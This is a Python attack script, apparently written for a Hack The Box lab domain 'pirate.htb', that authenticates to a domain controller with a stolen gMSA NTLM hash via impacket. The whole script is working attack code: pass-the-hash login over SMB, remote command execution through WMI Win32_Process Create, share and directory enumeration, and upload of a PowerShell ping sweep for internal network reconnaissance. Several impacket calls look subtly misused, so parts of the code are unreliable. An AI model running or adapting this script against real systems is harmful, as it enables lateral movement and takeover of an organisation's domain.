#!/usr/bin/env python3
"""
Direct execution on DC01 via SMB/WMI using gMSA_ADFS_prod$ hash
"""
import socket, sys, time, os

DC_IP = "10.129.8.87"
DC_HOST = "dc01.pirate.htb"
DOMAIN = "pirate.htb"
USER = "gMSA_ADFS_prod$"
NTLM_HASH = "8126756fb2e69697bfcb04816e685839"

# Monkey-patch DNS
_orig = socket.getaddrinfo
def _p(host, port, *a, **kw):
    if isinstance(host, str) and "pirate.htb" in host.lower():
        host = DC_IP
    return _orig(host, port, *a, **kw)
socket.getaddrinfo = _p

from impacket.smbconnection import SMBConnection

def smb_exec_and_read(cmd, output_path=r"C:\Windows\Temp\out.txt"):
    """Execute command via SMB and read output"""
    from impacket.dcerpc.v5 import transport, srvs, scmr
    from impacket.dcerpc.v5.dcom import wmi
    from impacket.dcerpc.v5.dcomrt import DCOMConnection
    
    dcom = DCOMConnection(DC_IP, USER, '', DOMAIN, '', NTLM_HASH, 
                          oxidResolver=True, doKerberos=False)
    
    iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
    iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
    iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL='', Auth='')
    
    # Execute command
    full_cmd = f'cmd.exe /c ({cmd}) > {output_path} 2>&1'
    iWbemServices.ExecMethod('Win32_Process', 'Create', {'CommandLine': full_cmd})
    
    time.sleep(2)
    
    # Read result via SMB
    smb = SMBConnection(DC_IP, DC_IP)
    smb.login(USER, '', DOMAIN, '', NTLM_HASH)
    
    out = b""
    fid = smb.openFile(smb.connectTree("C$"), output_path.replace("C:\\", "\\").replace("\\\\", "\\"))
    out = smb.readFile(smb._SMBConnection, fid)
    smb.closeFile(smb._SMBConnection, fid)
    smb.disconnectTree(smb._SMBConnection)
    
    return out.decode(errors='replace')

# Try direct SMB approach instead
print("[*] Connecting to DC01 via SMB with gMSA_ADFS_prod$ NTLM hash...")

smb = SMBConnection(DC_IP, DC_IP)
smb.login(USER, '', DOMAIN, '', NTLM_HASH)
print(f"[+] SMB connected! Server OS: {smb.getServerOSBuild()}")
print(f"[+] Server: {smb.getServerName()}")

# List available shares
shares = smb.listShares()
print("\n[+] Shares:")
for sh in shares:
    name = sh['shi1_netname'][:-1]
    if name and name != '\x00':
        print(f"    {name}")

# Try to list C:\Windows\Temp to check upload permissions
try:
    files = smb.listPath("C$", "\\Windows\\Temp\\*")
    print("\n[+] C:\\Windows\\Temp contents (first 10):")
    for f in files[:10]:
        print(f"    {f.get_longname()}")
except Exception as e:
    print(f"[-] Can't list C$\\Windows\\Temp: {e}")

# Write PS script to C$ and execute via WinRM
ps_scan = r"""
$results = @()
1..254 | ForEach-Object {
    $ip = "192.168.100.$_"
    $ping = Test-Connection -ComputerName $ip -Count 1 -Quiet -ErrorAction SilentlyContinue
    if ($ping) { $results += "ALIVE: $ip" }
}
$results | Out-File C:\Windows\Temp\scan.txt -Encoding UTF8
"Done: $($results.Count) hosts found" | Add-Content C:\Windows\Temp\scan.txt
"""

script_bytes = ps_scan.encode('utf-8-sig')
try:
    with smb.openFile(smb.connectTree("C$"), r"\Windows\Temp\scan_internal.ps1", 
                       desiredAccess=0x40000000, 
                       creationDisposition=2) as fid:
        smb.writeFile(smb._SMBConnection, fid, script_bytes)
    print("[+] PS script uploaded!")
except Exception as e:
    # Try alternative
    print(f"[-] SMB write failed: {e}")
    # Try to write via impacket differently
    import io
    tid = smb.connectTree("C$")
    fid = smb.createFile(tid, r"\Windows\Temp\scan_internal.ps1")
    smb.writeFile(tid, fid, script_bytes)
    smb.closeFile(tid, fid)
    print("[+] PS script uploaded (method 2)!")
